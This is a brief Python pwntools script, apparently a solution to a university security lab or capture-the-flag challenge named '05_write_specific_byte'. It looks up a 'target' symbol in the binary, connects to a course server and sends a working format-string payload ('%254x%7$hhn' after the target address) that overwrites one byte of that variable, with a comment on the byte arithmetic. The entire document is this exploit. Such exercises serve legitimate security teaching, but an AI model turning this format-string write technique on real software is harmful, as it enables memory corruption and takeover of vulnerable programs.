from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25195

PROG_NAME = "05_write_specific_byte"

elf = ELF(PROG_NAME)
target_address = elf.symbols["target"]
print("Target address: ", target_address)

s = remote(SERVER, PORT)

s.sendline(p32(target_address + 3) + b"%254x%7$hhn")
# 4(address) + 254 = 258 mod 256 = 2
print(s.recv())
